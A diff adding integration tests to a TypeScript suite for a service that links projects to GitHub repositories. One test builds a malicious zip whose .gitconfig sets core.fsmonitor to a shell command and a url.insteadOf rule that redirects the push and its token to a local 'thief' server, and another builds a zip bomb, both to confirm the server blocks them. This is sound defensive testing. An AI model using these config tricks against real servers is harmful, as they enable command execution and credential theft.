@@ -477,6 +477,52 @@ describe('Code home through the API: connect, lock, claim, webhooks', () => {
     expect(pushToken).toMatchObject({ repositories: [main.full_name.split('/')[1]], permissions: { contents: 'write' }, revoked: true });
   });
 
+  it('a zip cannot configure git on the server: a .gitconfig in it runs nothing and does not redirect the push (or its token)', async () => {
+    const c = await connectedCreator('gitcfg');
+    const projectId = await claim(c.session, `Git Config ${randomBytes(2).toString('hex')}`);
+    const marker = path.join(os.tmpdir(), `cc-pwned-${randomBytes(6).toString('hex')}`);
+    // A server that would receive the push (and its token) if git followed the zip's url.insteadOf.
+    let stolen = '';
+    const thief = (await import('node:http')).createServer((req, res) => {
+      stolen += String(req.headers.authorization || 'request');
+      res.writeHead(500);
+      res.end();
+    });
+    await new Promise<void>((r) => thief.listen(0, '127.0.0.1', () => r()));
+    const thiefUrl = `http://127.0.0.1:${(thief.address() as any).port}/`;
+    try {
+      const z = new JSZip();
+      z.file('README.md', '# hi\n');
+      z.file('.gitconfig', `[core]\n\tfsmonitor = "touch ${marker}; false"\n[url "${thiefUrl}"]\n\tinsteadOf = ${gh.url}/\n`);
+      z.file('.config/git/config', `[core]\n\tfsmonitor = "touch ${marker}; false"\n`);
+      const res = await fetch(`${running.base}/api/v1/projects/${projectId}/code-home`, {
+        method: 'POST',
+        headers: { Authorization: `Bearer ${c.session.accessToken}`, 'Content-Type': 'application/zip' },
+        body: new Uint8Array(await z.generateAsync({ type: 'nodebuffer' }))
+      });
+      const body: any = await res.json();
+      expect(res.status).toBe(201);
+      expect(fs.existsSync(marker), 'a command from the zip ran on the server').toBe(false);
+      expect(stolen, 'the push went somewhere else').toBe('');
+      expect(body.repositories[0].initial_commit.matches).toBe(true);
+      // The files themselves are kept as ordinary files of the project.
+      const bare = gh.repos.get(body.repositories[0].full_name)!.bare;
+      const listed = spawnSync('git', ['--git-dir', bare, 'ls-tree', '-r', '--name-only', 'HEAD'], { encoding: 'utf8' }).stdout.trim().split('\n').sort();
+      expect(listed).toEqual(['.config/git/config', '.gitconfig', 'README.md']);
+    } finally {
+      thief.close();
+      fs.rmSync(marker, { force: true });
+    }
+  });
+
+  it('a zip bomb (a small file that unpacks to more than 100 MB) is refused without unpacking it all', async () => {
+    const z = new JSZip();
+    z.file('zeros.bin', Buffer.alloc(120 * 1024 * 1024), { compression: 'DEFLATE', compressionOptions: { level: 9 } });
+    const bomb = await z.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' });
+    expect(bomb.length).toBeLessThan(1024 * 1024);
+    await expect(readZip(bomb)).rejects.toThrow(/larger than 100 MB/);
+  }, 60_000);
+
   it('a dangerous zip is refused before anything is created on GitHub', async () => {
     const c = await connectedCreator('badzip');
     const projectId = await claim(c.session, `Bad Zip ${randomBytes(2).toString('hex')}`);
@@ -515,6 +561,33 @@ describe('Code home through the API: connect, lock, claim, webhooks', () => {
     const failed = (await adminDb.query(`SELECT payload FROM event WHERE project_id = $1 AND action = 'repository.creation_failed'`, [second])).rows[0].payload;
     expect(failed.error).toEqual({ status: 422, message: 'Repository creation failed.' });
     expect((await adminDb.query('SELECT 1 FROM repository WHERE project_id = $1', [second])).rowCount).toBe(0);
+  });
+
+  it('a claim that stopped half way can be finished: only the missing repository is created', async () => {
+    const c = await connectedCreator('halfway', { plan: 'team' });
+    const name = `Half ${randomBytes(2).toString('hex')}`;
+    const projectId = await claim(c.session, name);
+    // Someone already has a repository with the core repository's name, so GitHub refuses that one.
+    const core = `${repositoryName(name)}-core`;
+    const blocker = await claim(c.session, `${name} core`);
+    expect(repositoryName(`${name} core`)).toBe(core);
+    expect((await api(running.base, c.session, `/projects/${blocker}/code-home`, { method: 'POST', body: {} })).status).toBe(201);
+
+    const first = await api(running.base, c.session, `/projects/${projectId}/code-home`, { method: 'POST', body: { split_core: true } });
+    expect(first.status).toBe(502);
+    expect(first.body.repositories.map((r: any) => r.role)).toEqual(['main']);
+
+    // The name is freed on GitHub; asking again creates only the core repository.
+    gh.repos.delete(`${c.org}/${core}`);
+    await adminDb.query('DELETE FROM repository WHERE full_name = $1', [`${c.org}/${core}`]);
+    const before = gh.repos.size;
+    const second = await api(running.base, c.session, `/projects/${projectId}/code-home`, { method: 'POST', body: { split_core: true } });
+    expect(second.status).toBe(201);
+    expect(second.body.repositories.map((r: any) => r.role)).toEqual(['core']);
+    expect(gh.repos.size).toBe(before + 1);
+    const actions = (await adminDb.query('SELECT action FROM event WHERE project_id = $1 ORDER BY seq', [projectId])).rows.map((r) => r.action);
+    expect(actions).toEqual(['project.claimed', 'repository.created', 'repository.creation_failed', 'repository.created']);
+    expect((await api(running.base, c.session, `/projects/${projectId}/code-home`, { method: 'POST', body: { split_core: true } })).status).toBe(409);
   });
 
   it('the browser cannot name repositories at claim time any more', async () => {
